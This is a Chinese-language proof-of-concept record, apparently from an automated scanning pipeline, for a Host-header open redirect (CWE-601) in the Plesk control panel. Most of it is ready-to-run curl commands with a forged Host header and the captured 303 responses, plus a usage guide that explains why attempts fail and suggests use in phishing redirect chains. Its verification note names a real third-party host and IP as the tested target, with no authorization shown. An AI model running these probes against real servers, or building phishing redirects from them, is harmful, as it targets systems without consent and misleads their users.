# Plesk 面板 sw-cp-server 未认证 303 Location 反射 Host 头（/smb/、/phpmyadmin/ 开放重定向形态）

- **code**: plesk-sw-cp-server-303-location-host-header-open-redirect
- **kind**: poc
- **category**: auth-bypass
- **component**: Plesk 面板（sw-cp-server / nginx 前端，443 与 8443）
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 17:03-17:06 UTC 本机 curl 直连 88.208.224.249（--resolve 指定 mail.goffsgames.co.uk:443 与 :8443），finding#116 / finding_checks.verdict=verified。① 443 GET /smb/ 带 Host: evil.example.com → HTTP/1.1 303，Location: https://evil.example.com/login.php?success_redirect_url=%2Fsmb%2F，Server: sw-cp-server、X-Powered-By: PleskLin；② 同 URL 对照 Host: mail.goffsgames.co.uk → Location: https://mail.goffsgames.co.uk/login.php?success_redirect_url=%2Fsmb%2F（排除固定外部跳转/误报）；③ /phpmyadmin/ 同型（Location 中 success_redirect_url=%2Fphpmyadmin%2F）；④ 8443 经 nginx 前端同样反射（HTTP/2 303，Location: https://evil.example.com/login.php?...；对照正确 Host 带 :8443 端口）；⑤ 反证：/login.php?success_redirect_url=https%3A%2F%2Fevil.example%2Fpwn 未认证仅 303 到 login_up.php，不执行外部跳转。原始响应头落盘 /opt/artex/data/tasks/11/i1509/raw/{h3_smb_hostevil.hdr,h3_smb_ctrl.hdr,h3_pma_hostevil.hdr,x_smb8443_evil.hdr,x_smb8443_ctrl.hdr,r_su_evil.hdr}。
- **path**: pocs/plesk-sw-cp-server-303-location-host-header-open-redirect/plesk_303_host_header_open_redirect.sh
- **tags**: plesk, sw-cp-server, host-header-injection, open-redirect, cwe-601, 303, location, unauth, 8443, phishing
- **created_at**: 2026-11-11T17:11:42.776Z
- **engine**: mail.goffsgames.co.uk (88.208.224.249)，443 + 8443

## 描述

Plesk 控制面板（sw-cp-server；8443 经 nginx 前端）对未认证的 /smb/、/phpmyadmin/（以及登录跳转链）返回 303 时，Location 的 scheme+host 直接取自请求 Host 头，未做白名单校验，形成 CWE-601 开放重定向。可用于钓鱼跳转链、可信域名 URL 构造；因需可控 Host 头（浏览器直连默认发真实 Host），且响应为 no-store 不可缓存投毒，实际危害限于低危。

## 用法

```
【前置条件】目标为 Plesk 面板（响应头 Server: sw-cp-server / X-Powered-By: PleskLin 可辨识），443 或 8443 可达；客户端能自定义 Host 头（curl --resolve / 中间层 / 反向代理均可）。

【1) 主验证：Host 注入】
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
     -H 'Host: evil.example.com' https://mail.example.com/smb/
判据：HTTP 303 且 Location: https://evil.example.com/login.php?success_redirect_url=%2Fsmb%2F

【2) 基线对照（必做，排除固定跳转/误报）】
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
     -H 'Host: mail.example.com' https://mail.example.com/smb/
期望：Location 回到 https://mail.example.com/login.php?...

【3) 其他入口与端口（同型批量确认）】
- /phpmyadmin/ → success_redirect_url=%2Fphpmyadmin%2F
- 8443（nginx 前端）：把 URL 换成 https://<host>:8443/smb/，--resolve 端口对 8443；对照 Host 带 :8443 时 Location 也带端口
- 也可直接 Host: <IP> 访问 https://<IP>:8443/smb/ 复现

【4) 边界反证（别把"登录后 success_redirect_url 可外跳"当漏洞）】
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
  'https://mail.example.com/login.php?success_redirect_url=https%3A%2F%2Fevil.example%2Fpwn'
未认证时仅 303 到 login_up.php，外部 URL 不被执行 —— 说明该场景不可直接用于未认证钓鱼外跳。

【失败常见原因】
- 直接浏览器打开：浏览器不允许改 Host，必然看到真实域 Location → 必须用 curl/代理注入；
- 前置 CDN/WAF 重写了 Host（如 Cloudflare）→ 打源站 IP + --resolve 或看 Host 是否被改写；
- 目标 Plesk 版本已修复（Location 用固定 server_name）→ 换成 /phpmyadmin/、/login.php 等再看，或直接判阴性；
- 响应 Cache-Control: no-store, no-cache → 不要按缓存投毒方向投入，投毒路径已封闭（对照 retro32 / Shopify 同类结论）。
```

## 正文

```
# Plesk sw-cp-server 303 Location 反射 Host 头（开放重定向形态）

## 指纹
Server: sw-cp-server / X-Powered-By: PleskLin（443）
8443 常由 nginx 前置，Server: nginx，但 Location 生成逻辑相同
Cookie/页面：login.php、login_up.php、P3p 头为 Plesk 特征

## 最小复现（443）
# Host 注入
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
     -H 'Host: evil.example.com' https://mail.example.com/smb/

HTTP/1.1 303 See Other
Cache-Control: no-store, no-cache, must-revalidate
Expires: Fri, 28 May 1999 00:00:00 GMT
Location: https://evil.example.com/login.php?success_redirect_url=%2Fsmb%2F
P3p: CP="NON COR CURa ADMa OUR NOR UNI COM NAV STA"
Pragma: no-cache
Server: sw-cp-server
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Powered-By: PleskLin
X-Xss-Protection: 1; mode=block

# 基线对照
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
     -H 'Host: mail.example.com' https://mail.example.com/smb/
→ Location: https://mail.example.com/login.php?success_redirect_url=%2Fsmb%2F

# /phpmyadmin/ 同型
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
     -H 'Host: evil.example.com' https://mail.example.com/phpmyadmin/
→ Location: https://evil.example.com/login.php?success_redirect_url=%2Fphpmyadmin%2F

## 8443（nginx 前端）
curl -sk -D - -o /dev/null --resolve mail.example.com:8443:<IP> \
     -H 'Host: evil.example.com' https://mail.example.com:8443/smb/
→ HTTP/2 303
   location: https://evil.example.com/login.php?success_redirect_url=%2Fsmb%2F

curl -sk -D - -o /dev/null --resolve mail.example.com:8443:<IP> \
     -H 'Host: mail.example.com' https://mail.example.com:8443/smb/
→ location: https://mail.example.com:8443/login.php?success_redirect_url=%2Fsmb%2F

## 边界反证
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
  'https://mail.example.com/login.php?success_redirect_url=https%3A%2F%2Fevil.example%2Fpwn'
→ 303 Location: https://mail.example.com/login_up.php?success_redirect_url=https%3A%2F%2Fevil.example%2Fpwn
（未认证下外部 URL 仅作为参数被保留，不执行外跳）

## 结论与限制
- Location 的 scheme+host 取自请求 Host 头，任意主机被反射 → 开放重定向形态（CWE-601）。
- 响应带 Cache-Control: no-store / Pragma: no-cache → 不能升级为缓存投毒。
- 浏览器直连无法自定义 Host，需 curl --resolve / 中间代理，故评为 low。
- 可用于构造指向 Plesk 自身路径的可信域跳转链，配合钓鱼/社工场景。
```
